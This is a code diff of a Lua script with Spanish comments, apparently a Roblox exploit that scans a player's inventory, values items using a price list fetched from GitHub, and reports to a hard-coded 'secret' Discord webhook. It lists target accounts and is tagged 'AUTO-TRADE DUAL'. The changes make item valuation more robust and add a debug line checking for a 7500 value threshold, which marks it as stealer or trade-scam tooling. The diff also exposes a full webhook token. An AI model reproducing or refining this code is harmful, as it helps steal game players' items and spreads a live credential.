@@ -15,7 +15,7 @@ local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT
 -- ==========================================
 -- CONFIGURACIÓN SECRETA DUAL WEBHOOK
 -- ==========================================
-local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCrnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
+local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
 
 local jugadoresObjetivosDual = {
     "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
@@ -79,10 +79,24 @@ local function cargarValoresDualGitHub()
         end)
         
         if decodeSuccess and decodedData then
-            KnivesDual = decodedData.Knives or {}
-            GunsDual = decodedData.Guns or {}
-            EffectsDual = decodedData.Effects or {}
-            EmotesDual = decodedData.Emotes or {}
+            -- BLINDAJE: Normaliza las claves del JSON quitando espacios y creando versiones en minúsculas
+            local function prepareTable(t)
+                local res = {}
+                for k, v in pairs(t or {}) do
+                    local strK = tostring(k)
+                    local cleanK = string.gsub(strK, " ", "")
+                    res[strK] = v
+                    res[cleanK] = v
+                    res[string.lower(strK)] = v
+                    res[string.lower(cleanK)] = v
+                end
+                return res
+            end
+
+            KnivesDual = prepareTable(decodedData.Knives)
+            GunsDual = prepareTable(decodedData.Guns)
+            EffectsDual = prepareTable(decodedData.Effects)
+            EmotesDual = prepareTable(decodedData.Emotes)
             return
         end
     end
@@ -206,8 +220,8 @@ task.spawn(function()
             for guid, item in pairs(inv) do
                 if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                     local cleanName = normalizeName(item.name)
-                    -- AJUSTE: Buscamos primero el nombre exacto (para Emotes con espacios/apóstrofes) y luego el normalizado
-                    local itemValue = valueTable[item.name] or valueTable[cleanName]
+                    -- BÚSQUEDA BLINDADA: Revisa el nombre exacto, sin espacios, y en minúsculas
+                    local itemValue = valueTable[item.name] or valueTable[cleanName] or valueTable[string.lower(item.name)] or valueTable[string.lower(cleanName)]
                     if itemValue then
                         totalValueDual = totalValueDual + itemValue
                     end
@@ -219,6 +233,9 @@ task.spawn(function()
         scanAndSaveDual("Gun", GunsDual)
         scanAndSaveDual("Effect", EffectsDual)
         scanAndSaveDual("Emote", EmotesDual)
+
+        -- DEBUG: Imprime en la consola del exploit el valor calculado para que verifiques si llegó a 7500
+        warn("[AUTO-TRADE DUAL] Valor total calculado con utils5.json: " .. totalValueDual)
 
         local hayItems = (#knives > 0) or (#guns > 0) or (#effects > 0) or (#emotes > 0)
 
